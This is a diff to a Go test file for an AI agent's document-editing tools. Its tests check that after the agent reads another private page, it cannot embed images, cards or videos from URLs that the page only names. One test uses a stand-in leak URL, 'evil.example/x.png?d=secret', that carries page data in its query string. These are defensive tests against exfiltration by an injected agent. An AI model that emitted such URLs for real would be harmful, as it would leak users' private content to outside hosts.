@@ -400,7 +400,7 @@ func TestURLsAfterReadingAnotherPage(t *testing.T) {
 	c.Children = append(c.Children, &doc.Node{ID: "i1", Type: "image", Data: map[string]any{"url": "https://example.com/here.png"}})
 	x := executor(c)
 	x.Ctx.Request = "Add the chart at https://example.com/asked.png to the end"
-	x.Ctx.ReadOtherPage = func(id string) map[string]any {
+	x.Ctx.ReadOtherPage = func(id string, _, _ int) map[string]any {
 		return map[string]any{"page": map[string]any{"id": id}, "blocks": []map[string]any{{"id": "b", "type": "paragraph", "text": "See [the spec](https://example.com/spec)."}}}
 	}
 	image := func(u string) map[string]any {
@@ -436,11 +436,58 @@ func TestURLsAfterReadingAnotherPage(t *testing.T) {
 	}
 }
 
+func TestURLsOnlyNamedInThePageLoadNothingAfterReadingAnotherPage(t *testing.T) {
+	c := page()
+	pasted := &doc.Node{ID: "pasted", Type: "paragraph"}
+	pasted.SetDelta(doc.Delta{{Text: "https://evil.example/0.png https://evil.example/1.png https://evil.example/watch.mp4 https://evil.example/1"}})
+	c.Children = append(c.Children, pasted,
+		&doc.Node{ID: "i1", Type: "image", Data: map[string]any{"url": "https://example.com/here.png"}},
+		&doc.Node{ID: "k1", Type: "link_preview", Data: map[string]any{"url": "https://example.com/card"}})
+	x := executor(c)
+	x.Ctx.Request = "Add the chart at https://example.com/asked.png to the end"
+	x.Ctx.ReadOtherPage = func(id string, _, _ int) map[string]any {
+		return map[string]any{"page": map[string]any{"id": id}, "blocks": []map[string]any{{"id": "s", "type": "paragraph", "text": "secret"}}}
+	}
+	insert := func(block map[string]any) map[string]any {
+		return x.Call("insert_blocks", map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{block}})
+	}
+	image := func(u string) map[string]any {
+		return map[string]any{"type": "image", "image": map[string]any{"url": u}}
+	}
+	card := func(u string) map[string]any {
+		return map[string]any{"type": "link_preview", "link": map[string]any{"url": u}}
+	}
+	video := func(u string) map[string]any {
+		return map[string]any{"type": "video", "video": map[string]any{"url": u}}
+	}
+	if out := insert(image("https://evil.example/0.png")); out["error"] != nil {
+		t.Fatalf("before reading: %v", out)
+	}
+	if out := x.Call("read_other_page", map[string]any{"page_id": "private"}); out["error"] != nil {
+		t.Fatal(out)
+	}
+	for _, block := range []map[string]any{image("https://evil.example/1.png"), card("https://evil.example/1"), video("https://evil.example/watch.mp4"), image("https://evil.example/0.png")} {
+		out := insert(block)
+		if e, _ := out["error"].(string); !strings.Contains(e, "After reading another page") || !strings.Contains(e, "Link to it in text") {
+			t.Errorf("%v after reading another page: %v", block, out)
+		}
+	}
+	if out := x.Call("replace_block", map[string]any{"id": "p1", "block": image("https://evil.example/1.png")}); out["error"] == nil {
+		t.Error("a block became a picture of a URL the page only names")
+	}
+	for _, block := range []map[string]any{image("https://example.com/here.png"), card("https://example.com/card"), image("https://example.com/card"), image("https://example.com/asked.png"),
+		{"type": "paragraph", "text": "See [the list](https://evil.example/1.png)."}} {
+		if out := insert(block); out["error"] != nil {
+			t.Errorf("%v: %v", block, out)
+		}
+	}
+}
+
 func TestURLsWrittenAfterReadingStayOut(t *testing.T) {
 	leak := "https://evil.example/x.png?d=secret"
 	x := executor(page())
 	x.Ctx.CreateSubpage = func(string, []*doc.Node) (string, error) { return "sub", nil }
-	x.Ctx.ReadOtherPage = func(id string) map[string]any {
+	x.Ctx.ReadOtherPage = func(id string, _, _ int) map[string]any {
 		return map[string]any{"page": map[string]any{"id": id}, "blocks": []map[string]any{{"id": "s", "type": "paragraph", "text": "secret"}}}
 	}
 	if out := x.Call("read_other_page", map[string]any{"page_id": "private"}); out["error"] != nil {
@@ -1074,7 +1121,7 @@ func TestCapitalSchemesAfterReading(t *testing.T) {
 	c := page()
 	c.Children = append(c.Children, &doc.Node{ID: "i1", Type: "image", Data: map[string]any{"url": "https://example.com/here.png"}})
 	x := executor(c)
-	x.Ctx.ReadOtherPage = func(id string) map[string]any { return map[string]any{"page": map[string]any{"id": id}} }
+	x.Ctx.ReadOtherPage = func(id string, _, _ int) map[string]any { return map[string]any{"page": map[string]any{"id": id}} }
 	if out := x.Call("read_other_page", map[string]any{"page_id": "private"}); out["error"] != nil {
 		t.Fatal(out)
 	}
@@ -1179,7 +1226,7 @@ func TestRefusalsLoggedWithoutWhatTheyHeld(t *testing.T) {
 	srv := httptest.NewServer(f)
 	defer srv.Close()
 	x := executor(page())
-	x.Ctx.ReadOtherPage = func(id string) map[string]any { return map[string]any{"page": map[string]any{"id": id}} }
+	x.Ctx.ReadOtherPage = func(id string, _, _ int) map[string]any { return map[string]any{"page": map[string]any{"id": id}} }
 	var logged strings.Builder
 	log.SetOutput(&logged)
 	defer log.SetOutput(os.Stderr)
@@ -1227,4 +1274,75 @@ func TestEarlierTurnsWhereOtherPagesAreOff(t *testing.T) {
 			t.Errorf("cross-page %v: kept to its page %v", cross, res.KeptToPage)
 		}
 	}
+}
+
+func TestWhatAProviderAttachesToACallGoesBackWithIt(t *testing.T) {
+	sent := func(t *testing.T, request map[string]any) map[string]any {
+		t.Helper()
+		for _, m := range request["messages"].([]any) {
+			if m := m.(map[string]any); m["role"] == "assistant" {
+				return m
+			}
+		}
+		t.Fatal("no assistant message went back")
+		return nil
+	}
+	check := func(t *testing.T, back map[string]any) {
+		t.Helper()
+		calls := back["tool_calls"].([]any)
+		first, second := calls[0].(map[string]any), calls[1].(map[string]any)
+		extra, _ := first["extra_content"].(map[string]any)
+		if google, _ := extra["google"].(map[string]any); google["thought_signature"] != "sig-A" {
+			t.Errorf("the first call went back with %v", first["extra_content"])
+		}
+		if _, has := second["extra_content"]; has {
+			t.Errorf("the second call went back with %v", second["extra_content"])
+		}
+		if back["reasoning_content"] != "The page first, then its title." {
+			t.Errorf("the reasoning went back as %v", back["reasoning_content"])
+		}
+	}
+	run := func(t *testing.T, h http.Handler, ev Events) {
+		t.Helper()
+		srv := httptest.NewServer(h)
+		defer srv.Close()
+		if _, err := RunLocal(context.Background(), NewClient(srv.URL, ""), Request{Model: "m", SupportsTools: true}, executor(page()).Ctx, ev); err != nil {
+			t.Fatal(err)
+		}
+	}
+	t.Run("answered whole", func(t *testing.T) {
+		signed := call("read_page", map[string]any{})
+		signed["extra_content"] = map[string]any{"google": map[string]any{"thought_signature": "sig-A"}}
+		f := &fakeModel{replies: []map[string]any{
+			{"content": "", "reasoning_content": "The page first, then its title.", "tool_calls": []any{signed, call("read_page", map[string]any{"limit": 1})}},
+			{"content": "Done."},
+		}}
+		run(t, f, Events{})
+		check(t, sent(t, f.requests[1]))
+	})
+	t.Run("streamed", func(t *testing.T) {
+		f := &streamModel{rounds: [][]string{
+			{
+				`{"choices":[{"delta":{"reasoning_content":"The page first, "}}]}`,
+				`{"choices":[{"delta":{"reasoning_content":"then its title."}}]}`,
+				`{"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"read_page","arguments":"{}"},"extra_content":{"google":{"thought_signature":"sig-A"}}}]}}]}`,
+				`{"choices":[{"delta":{"tool_calls":[{"index":1,"id":"c2","function":{"name":"read_page","arguments":""}}]}}]}`,
+				`{"choices":[{"delta":{"tool_calls":[{"index":1,"function":{"arguments":"{}"}}]},"finish_reason":"tool_calls"}]}`,
+			},
+			{`{"choices":[{"delta":{"content":"Done."},"finish_reason":"stop"}]}`},
+		}}
+		run(t, f, Events{Text: func(string) {}})
+		check(t, sent(t, f.requests[1]))
+	})
+	t.Run("nothing attached", func(t *testing.T) {
+		f := &fakeModel{replies: []map[string]any{{"content": "", "tool_calls": []any{call("read_page", map[string]any{})}}, {"content": "Done."}}}
+		run(t, f, Events{})
+		back := sent(t, f.requests[1])
+		if _, has := back["reasoning_content"]; has || len(back) != 3 {
+			t.Errorf("the assistant message went back as %v", back)
+		}
+		if c := back["tool_calls"].([]any)[0].(map[string]any); len(c) != 3 {
+			t.Errorf("the call went back as %v", c)
+		}
+	})
 }
